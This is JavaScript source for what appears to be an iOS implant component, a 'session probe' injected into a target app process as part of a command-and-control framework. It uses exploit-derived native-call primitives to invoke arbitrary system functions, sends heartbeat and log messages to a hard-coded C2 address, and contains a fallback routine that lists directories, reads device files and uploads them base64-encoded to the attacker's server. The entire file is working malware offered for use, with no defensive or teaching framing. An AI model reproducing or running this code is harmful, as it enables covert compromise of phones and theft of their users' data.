// E4/P3 session probe - runs IN target process (not SpringBoard)
// Placeholders replaced by pe before InjectJS: __SESSION_ID__ __SESSION_TARGET__
// Stop: pe writes /tmp/c2_ipc/session.<id>.stop

const PELOG_HOST = "192.168.31.32";
const PELOG_PORT = 9090;
const SESSION_ID = "__SESSION_ID__";
const SESSION_TARGET = "__SESSION_TARGET__";
const HB_PATH = "/tmp/c2_ipc/session." + SESSION_ID + ".hb";
const STOP_PATH = "/tmp/c2_ipc/session." + SESSION_ID + ".stop";

/*__PAYLOAD_FALLBACK_BEGIN__*/
// Shared payload failure fallback (SB bootstrap / pe session).
// On fail: report error + ios/app versions; upload small related files + structure doc.
// Files > 1MiB are skipped. Backend: POST /api/payload/fallback (+ /result category=payload_fallback)

function __fb_readStr(ptr, len) {
  try {
    if (typeof Native.readString === "function") return Native.readString(ptr, len);
  } catch (e) {}
  try {
    if (typeof Native.readCString === "function") return Native.readCString(ptr, len);
  } catch (e) {}
  try {
    if (typeof Native.read === "function") {
      var buff = Native.read(ptr, len);
      var a = new Uint8Array(buff), s = "";
      for (var i = 0; i < a.length; i++) {
        if (!a[i]) break;
        s += String.fromCharCode(a[i]);
      }
      return s;
    }
  } catch (e) {}
  return "";
}

function __fb_sysctlStr(name) {
  try {
    var buf = Native.callSymbol("calloc", 1, 256);
    var lenp = Native.callSymbol("calloc", 1, 8);
    var lv = new DataView(new ArrayBuffer(8));
    lv.setUint32(0, 255, true);
    Native.write(lenp, lv.buffer);
    var rc = Number(Native.callSymbol("sysctlbyname", name, buf, lenp, 0, 0));
    var s = "";
    if (rc === 0) s = __fb_readStr(buf, 256);
    try { Native.callSymbol("free", buf); } catch (e) {}
    try { Native.callSymbol("free", lenp); } catch (e) {}
    return (s || "").replace(/\0/g, "").trim();
  } catch (e) {
    return "";
  }
}

function __fb_iosVersion() {
  var v = __fb_sysctlStr("kern.osproductversion");
  if (!v) v = __fb_sysctlStr("kern.osversion");
  return v || "";
}

function __fb_buildVersion() {
  return __fb_sysctlStr("kern.osversion") || "";
}

function __fb_httpPostJson(path, obj) {
  var host = (typeof BEACON_HOST !== "undefined") ? BEACON_HOST : ((typeof PELOG_HOST !== "undefined") ? PELOG_HOST : "192.168.31.32");
  var port = (typeof BEACON_PORT !== "undefined") ? BEACON_PORT : ((typeof PELOG_PORT !== "undefined") ? PELOG_PORT : 9090);
  var body = JSON.stringify(obj);
  if (typeof _sbPost === "function") {
    try { return _sbPost(host, port, path, "application/json", body); } catch (e) { return null; }
  }
  try {
    var fd = Number(Native.callSymbol("socket", 2, 1, 0));
    if (fd <= 0) return null;
    var sa = Native.callSymbol("calloc", 1, 16);
    var sab = new ArrayBuffer(16), sv = new DataView(sab);
    sv.setUint8(0, 16); sv.setUint8(1, 2); sv.setUint16(2, port, false);
    var p = String(host).split(".");
    sv.setUint8(4, +p[0]); sv.setUint8(5, +p[1]); sv.setUint8(6, +p[2]); sv.setUint8(7, +p[3]);
    Native.write(sa, sab);
    if (Number(Native.callSymbol("connect", fd, sa, 16)) !== 0) {
      Native.callSymbol("free", sa); Native.callSymbol("close", fd); return null;
    }
    Native.callSymbol("free", sa);
    var req = "POST " + path + " HTTP/1.0\r\nHost: " + host + ":" + port +
      "\r\nContent-Type: application/json\r\nContent-Length: " + body.length + "\r\n\r\n" + body;
    var buf = Native.callSymbol("malloc", req.length + 1);
    Native.writeString(buf, req);
    Native.callSymbol("write", fd, buf, req.length);
    Native.callSymbol("free", buf);
    var result = "";
    var rbuf = Native.callSymbol("malloc", 4096);
    if (rbuf) {
      for (var ri = 0; ri < 32; ri++) {
        var n = Number(Native.callSymbol("read", fd, rbuf, 4095));
        if (n <= 0) break;
        result += __fb_readStr(rbuf, n);
      }
      Native.callSymbol("free", rbuf);
    }
    Native.callSymbol("close", fd);
    var idx = result.indexOf("\r\n\r\n");
    var raw = idx >= 0 ? result.substring(idx + 4) : "";
    if (!raw) return {};
    try { return JSON.parse(raw); } catch (e) { return {}; }
  } catch (e) {
    return null;
  }
}

function __fb_b64(str) {
  if (typeof _strToB64 === "function") return _strToB64(str);
  var B = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
  var out = "", i = 0;
  while (i < str.length) {
    var c1 = str.charCodeAt(i++) & 0xff;
    var c2 = i < str.length ? str.charCodeAt(i++) & 0xff : NaN;
    var c3 = i < str.length ? str.charCodeAt(i++) & 0xff : NaN;
    var n1 = c1 >> 2;
    var n2 = ((c1 & 3) << 4) | (isNaN(c2) ? 0 : c2 >> 4);
    var n3 = isNaN(c2) ? 64 : (((c2 & 15) << 2) | (isNaN(c3) ? 0 : c3 >> 6));
    var n4 = isNaN(c3) ? 64 : (c3 & 63);
    out += B.charAt(n1) + B.charAt(n2) + (n3 === 64 ? "=" : B.charAt(n3)) + (n4 === 64 ? "=" : B.charAt(n4));
  }
  return out;
}

function __fb_fsSize(path) {
  try {
    var fd = Native.callSymbol("fopen", path, "rb");
    if (!fd || fd === 0 || fd === 0n) return -1;
    Native.callSymbol("fseek", fd, 0, 2);
    var sz = Number(Native.callSymbol("ftell", fd));
    Native.callSymbol("fclose", fd);
    return (sz >= 0 && isFinite(sz)) ? sz : -1;
  } catch (e) {
    return -1;
  }
}

function __fb_fsIsDir(path) {
  try {
    var d = Native.callSymbol("opendir", path);
    if (!d || d === 0 || d === 0n) return false;
    Native.callSymbol("closedir", d);
    return true;
  } catch (e) {
    return false;
  }
}

function __fb_listDir(path, maxEntries) {
  maxEntries = maxEntries || 128;
  var out = [];
  try {
    var d = Native.callSymbol("opendir", path);
    if (!d || d === 0 || d === 0n) return out;
    for (var i = 0; i < maxEntries; i++) {
      var ent = Native.callSymbol("readdir", d);
      if (!ent || ent === 0 || ent === 0n) break;
      var name = __fb_readStr(ent + 21n, 256);
      if (!name || name === "." || name === "..") continue;
      var child = path + "/" + name;
      var entry = { name: name, path: child };
      if (__fb_fsIsDir(child)) {
        entry.type = "dir";
      } else {
        entry.type = "file";
        entry.size = __fb_fsSize(child);
      }
      out.push(entry);
    }
    Native.callSymbol("closedir", d);
  } catch (e) {}
  return out;
}

function __fb_fsRead(path, maxLen) {
  if (typeof _fsRead === "function") {
    try { return _fsRead(path, maxLen); } catch (e) {}
  }
  maxLen = maxLen || 262144;
  try {
    var fd = Native.callSymbol("fopen", path, "rb");
    if (!fd || fd === 0 || fd === 0n) return null;
    var p = Native.callSymbol("malloc", maxLen + 1);
    if (!p) { Native.callSymbol("fclose", fd); return null; }
    var n = Number(Native.callSymbol("fread", p, 1, maxLen, fd));
    Native.callSymbol("fclose", fd);
    var s = n > 0 ? __fb_readStr(p, n) : "";
    if (n > 0 && typeof Native.read === "function") {
      try {
        var buff = Native.read(p, n);
        var a = new Uint8Array(buff);
        s = "";
        for (var i = 0; i < n; i++) s += String.fromCharCode(a[i]);
      } catch (e) {}
    }
    Native.callSymbol("free", p);
    return s;
  } catch (e) {
    return null;
  }
}

function __fb_postFallbackFile(fbId, uid, commandId, filename, dataStr) {
  var payload = {
    command_id: commandId || fbId,
    uuid: uid || "fallback",
    filename: filename,
    category: "payload_fallback",
    fallback_id: fbId,
    data: __fb_b64(dataStr)
  };
  __fb_httpPostJson("/result", payload);
}

/** Max upload size for fallback file content (1 MiB). Larger files are skipped. */
var __FB_MAX_UPLOAD = 1048576;

/**
 * Report payload failure. opts:
 *  module_id, stage, error, app_id, app_version,
 *  related_paths: string[], uid, command_id,
 *  upload_paths: string[]  (only files <= 1MiB; oversized skipped)
 *  Always uploads structure.json (tree / sizes / skip reasons).
 */
function __payloadFallbackReport(opts) {
  opts = opts || {};
  var maxUp = (opts.max_file > 0) ? opts.max_file : __FB_MAX_UPLOAD;
  if (maxUp > __FB_MAX_UPLOAD) maxUp = __FB_MAX_UPLOAD;
  var fbId = "fb-" + Date.now().toString(16) + "-" + Math.floor(Math.random() * 1e6).toString(16);
  var ios = opts.ios_version || __fb_iosVersion();
  var build = opts.build_version || __fb_buildVersion();
  var related = opts.related_paths || opts.paths || [];
  if (!Array.isArray(related)) related = related ? [String(related)] : [];
  var upload = opts.upload_paths || [];
  if (!Array.isArray(upload)) upload = upload ? [String(upload)] : [];
  var uid = opts.uid || opts.uuid || "";

  var structure = {
    fallback_id: fbId,
    max_upload: maxUp,
    related: [],
    upload_plan: [],
    note: "files > " + maxUp + " bytes skipped; only small files + this structure doc"
  };
  var seen = {};
  function addStructPath(path, role) {
    if (!path || seen[path]) return;
    seen[path] = 1;
    var row = { path: path, role: role || "related" };
    if (__fb_fsIsDir(path)) {
      row.type = "dir";
      row.entries = __fb_listDir(path, 128);
    } else {
      var sz = __fb_fsSize(path);
      row.type = "file";
      row.size = sz;
      row.exists = sz >= 0;
      if (sz > maxUp) {
        row.skip = "over_1m";
        row.upload = false;
      } else if (sz >= 0) {
        row.upload = true;
      } else {
        row.exists = false;
        row.upload = false;
      }
    }
    structure.related.push(row);
  }
  for (var ri = 0; ri < related.length; ri++) addStructPath(related[ri], "related");
  for (var ui = 0; ui < upload.length; ui++) addStructPath(upload[ui], "upload");

  var body = {
    fallback_id: fbId,
    uid: uid,
    module_id: opts.module_id || opts.module || "",
    stage: opts.stage || "",
    error: String(opts.error || opts.message || "").slice(0, 500),
    ios_version: ios,
    build_version: build,
    app_id: opts.app_id || opts.bundle_id || "",
    app_version: opts.app_version || opts.app_ver || "",
    related_paths: related,
    files: [],
    structure: structure,
    command_id: opts.command_id || "",
    meta: opts.meta || {}
  };
  var resp = null;
  try { resp = __fb_httpPostJson("/api/payload/fallback", body); } catch (e) { resp = null; }

  var uploaded = [];
  try {
    var structStr = JSON.stringify(structure, null, 2);
    __fb_postFallbackFile(fbId, uid, opts.command_id, "structure.json", structStr);
    uploaded.push({ path: "structure.json", via: "result", size: structStr.length });
  } catch (se) {
    uploaded.push({ path: "structure.json", via: "err", err: String(se).slice(0, 60) });
  }

  var candidates = [];
  for (var i = 0; i < upload.length; i++) if (upload[i]) candidates.push(upload[i]);
  for (var j = 0; j < structure.related.length; j++) {
    var r = structure.related[j];
    if (r.type === "file" && r.upload && r.role === "related" && candidates.indexOf(r.path) < 0) {
      if (r.size >= 0 && r.size <= 65536) candidates.push(r.path);
    }
  }

  for (var k = 0; k < candidates.length; k++) {
    var path = candidates[k];
    if (!path) continue;
    try {
      var sz = __fb_fsSize(path);
      structure.upload_plan.push({ path: path, size: sz });
      if (sz < 0) {
        uploaded.push({ path: path, via: "skip", err: "missing" });
        continue;
      }
      if (sz > maxUp) {
        uploaded.push({ path: path, via: "skip", err: "over_1m", size: sz });
        continue;
      }
      // Never _exfilFile here (no size guard). Bounded read only.
      var txt = __fb_fsRead(path, maxUp);
      if (txt != null && txt.length > 0) {
        if (txt.length > maxUp) {
          uploaded.push({ path: path, via: "skip", err: "over_1m", size: txt.length });
          continue;
        }
        var slash = path.lastIndexOf("/");
        var fname = slash >= 0 ? path.slice(slash + 1) : path;
        __fb_postFallbackFile(fbId, uid, opts.command_id, fname, txt);
        uploaded.push({ path: path, via: "result", size: txt.length });
      } else {
        uploaded.push({ path: path, via: "skip", err: "unreadable" });
      }
    } catch (ue) {
      uploaded.push({ path: path, via: "err", err: String(ue).slice(0, 60) });
    }
  }

  try {
    if (typeof _c2Log === "function") {
      _c2Log("[FALLBACK] " + (body.module_id || "") + " " + body.error.slice(0, 80) + " id=" + fbId);
    } else if (typeof _log === "function") {
      _log("[FALLBACK] " + (body.module_id || "") + " " + body.error.slice(0, 80) + " id=" + fbId);
    }
  } catch (e) {}

  return {
    fallback_id: fbId,
    ok: !!(resp && (resp.ok || (resp.data && resp.data.ok) || resp.code === 0)),
    resp: resp,
    uploaded: uploaded,
    skipped_over_1m: uploaded.filter(function (x) { return x.err === "over_1m"; }),
    ios_version: ios,
    app_id: body.app_id,
    app_version: body.app_version
  };
}
/*__PAYLOAD_FALLBACK_END__*/

class Native {
	static #baseAddr; static #dlsymAddr; static #memcpyAddr; static #mallocAddr; static #oinvAddr;
	static #argMem = 0n; static #argPtr = 0n; static #dlsymCache = {};

	static init() {
		const b = new BigUint64Array(nativeCallBuff);
		this.#baseAddr = b[20]; this.#dlsymAddr = b[21]; this.#memcpyAddr = b[22];
		this.#mallocAddr = b[23]; this.#oinvAddr = b[24];
		this.#argMem = this.#nc(this.#mallocAddr, BigInt(0x1000));
		this.#argPtr = this.#argMem;
	}

	static write(ptr, buff) {
		let u = new Uint8Array(nativeCallBuff), a = new Uint8Array(buff);
		for (let i = 0; i < a.length; i += 0x1000) {
			let n = a.length - i > 0x1000 ? 0x1000 : a.length - i;
			u.set(a.subarray(i, i + n), 0x1000);
			this.#nc(this.#memcpyAddr, ptr + BigInt(i), this.#baseAddr + 0x1000n, BigInt(n));
		}
	}

	static writeString(ptr, str) {
		let b = new ArrayBuffer(str.length + 1), a = new Uint8Array(b);
		for (let i = 0; i < str.length; i++) a[i] = str.charCodeAt(i);
		this.write(ptr, b);
	}

	static callSymbol(name, x0, x1, x2, x3) {
		this.#argPtr = this.#argMem;
		if (typeof x0 === "string") { let p = this.#argPtr; this.writeString(p, x0); this.#argPtr += BigInt(x0.length + 1); x0 = p; }
		if (typeof x1 === "string") { let p = this.#argPtr; this.writeString(p, x1); this.#argPtr += BigInt(x1.length + 1); x1 = p; }
		let r = this.#nc(this.#dlsym(name), this.#arg(x0), this.#arg(x1), this.#arg(x2), this.#arg(x3));
		this.#argPtr = this.#argMem;
		return r < 0xffffffffn && r > -0xffffffffn ? Number(r) : r;
	}

	static #arg(v) { return !v ? 0n : typeof v === "bigint" ? v : BigInt(v); }

	static #dlsym(name) {
		let hit = this.#dlsymCache[name];
		if (hit) return hit;
		let b = new ArrayBuffer(name.length + 1), a = new Uint8Array(b);
		for (let i = 0; i < name.length; i++) a[i] = name.charCodeAt(i);
		new Uint8Array(nativeCallBuff).set(a, 0x1000);
		hit = this.#nc(this.#dlsymAddr, 0xfffffffffffffffen, this.#baseAddr + 0x1000n);
		if (hit) this.#dlsymCache[name] = hit;
		return hit;
	}

	static #nc(addr, x0, x1, x2, x3) {
		let b = new BigInt64Array(nativeCallBuff);
		b[0] = addr; b[100] = x0 || 0n; b[101] = x1 || 0n; b[102] = x2 || 0n; b[103] = x3 || 0n;
		invoker();
		return b[200];
	}
}

function _log(msg) {
	try {
		const body = "seq=0&msg=" + encodeURIComponent(String(msg).slice(0, 500));
		const fd = Native.callSymbol("socket", 2, 1, 0);
		if (fd <= 0) return;
		const sa = Native.callSymbol("calloc", 1, 16);
		const sab = new ArrayBuffer(16), sv = new DataView(sab);
		sv.setUint8(0, 16); sv.setUint8(1, 2); sv.setUint16(2, PELOG_PORT, false);
		const p = PELOG_HOST.split(".");
		sv.setUint8(4, +p[0]); sv.setUint8(5, +p[1]); sv.setUint8(6, +p[2]); sv.setUint8(7, +p[3]);
		Native.write(sa, sab);
		if (Native.callSymbol("connect", fd, sa, 16) !== 0) {
			Native.callSymbol("free", sa); Native.callSymbol("close", fd); return;
		}
		Native.callSymbol("free", sa);
		const req = "POST /pelog HTTP/1.0\r\nHost: " + PELOG_HOST + ":" + PELOG_PORT +
			"\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: " + body.length + "\r\n\r\n" + body;
		const buf = Native.callSymbol("malloc", req.length + 1);
		Native.writeString(buf, req);
		Native.callSymbol("write", fd, buf, req.length);
		Native.callSymbol("free", buf);
		Native.callSymbol("close", fd);
	} catch (_) {}
}

function _writeHb(pid, tick) {
	try {
		const body = "{\"id\":\"" + SESSION_ID + "\",\"target\":\"" + SESSION_TARGET +
			"\",\"pid\":" + pid + ",\"tick\":" + tick + ",\"ts\":" + Date.now() + "}\n";
		const fd = Native.callSymbol("fopen", HB_PATH, "w");
		if (!fd || fd === 0 || fd === 0n) return;
		const p = Native.callSymbol("calloc", 1, body.length + 1);
		Native.writeString(p, body);
		Native.callSymbol("fwrite", p, 1, body.length, fd);
		Native.callSymbol("fclose", fd);
		Native.callSymbol("free", p);
	} catch (_) {}
}

function _stopRequested() {
	try {
		const fd = Native.callSymbol("fopen", STOP_PATH, "r");
		if (!fd || fd === 0 || fd === 0n) return false;
		Native.callSymbol("fclose", fd);
		return true;
	} catch (_) {
		return false;
	}
}

try {
	Native.init();
	invoker();
	try { Native.callSymbol("mkdir", "/tmp/c2_ipc", 0x1ff); } catch (_) {}
	const pid = Native.callSymbol("getpid");
	_log("[SESSION] start id=" + SESSION_ID + " target=" + SESSION_TARGET + " pid=" + pid);
	let tick = 0;
	for (;;) {
		tick++;
		_writeHb(pid, tick);
		if (tick === 1 || (tick % 5) === 0) {
			_log("[SESSION] hb id=" + SESSION_ID + " tick=" + tick + " pid=" + pid);
		}
		if (_stopRequested()) {
			_log("[SESSION] stop id=" + SESSION_ID + " tick=" + tick + " pid=" + pid);
			break;
		}
		Native.callSymbol("sleep", 2);
	}
} catch (e) {
	try { _log("[SESSION] THREW " + String(e).slice(0, 120)); } catch (_) {}
	try {
		if (typeof __payloadFallbackReport === "function") {
			__payloadFallbackReport({
				module_id: "session_probe",
				stage: "runtime",
				error: String(e).slice(0, 500),
				app_id: SESSION_TARGET,
				related_paths: [HB_PATH, STOP_PATH],
				meta: { session_id: SESSION_ID }
			});
		}
	} catch (_) {}
}
